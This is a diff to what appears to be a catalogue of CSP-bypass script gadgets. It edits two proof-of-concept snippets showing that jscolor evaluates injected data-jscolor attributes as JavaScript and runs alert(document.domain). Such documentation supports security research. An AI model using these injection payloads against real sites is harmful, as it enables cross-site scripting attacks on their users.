@@ -19,16 +19,16 @@ gadgets:
           [jscolor](https://github.com/EastDesire/jscolor) waits for `DOMContentLoaded` before calling `install()`, so it evaluates every `.jscolor` element regardless of whether it appears before or after the library is loaded. With `'unsafe-eval'` enabled in CSP, both payloads in the snippet below run as soon as the picker initializes.
         code: |
           <!-- user input -->
-          <x class="jscolor" data-jscolor="(function(){alert(document.domain)})()">
+          <x data-jscolor="(function(){alert(document.domain)})()">
 
           <script nonce="secret" src="https://jscolor.com/release/2.5/jscolor-2.5.2/jscolor.js"></script>
       - description: |
           Because the string is wrapped in parentheses, even seemingly safe object literals run as the body of the generated function. Any property initializers therefore execute as soon as jscolor parses the attribute.
         code: |
-          <script src="https://jscolor.com/release/2.5/jscolor-2.5.2/jscolor.js"></script>
-
           <!-- user input -->
-          <input value="#3399FF80" class="jscolor" data-jscolor="{a:alert(document.domain)}">
+          <x data-jscolor="{a:alert(document.domain)}">
+
+          <script src="https://jscolor.com/release/2.5/jscolor-2.5.2/jscolor.js"></script>
     more-info: |
       **Sink**
 
